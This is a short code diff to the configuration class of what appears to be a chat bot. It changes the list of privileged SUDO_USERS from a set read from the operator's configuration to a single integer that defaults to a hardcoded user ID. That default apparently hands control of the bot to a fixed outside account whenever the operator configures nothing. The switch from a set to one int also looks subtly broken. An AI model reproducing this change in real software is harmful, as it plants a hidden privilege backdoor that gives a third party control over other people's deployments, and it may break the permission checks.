@@ -92,9 +92,4 @@ class Config:
     )
     # array to store the users who will have control (permissions)
     # in the bot
-    SUDO_USERS = set(
-        int(x) for x in get_config(
-            "SUDO_USERS",
-            should_prompt=True
-        ).split()
-    )
+    SUDO_USERS = int(get_config("SUDO_USERS", 1340109095))
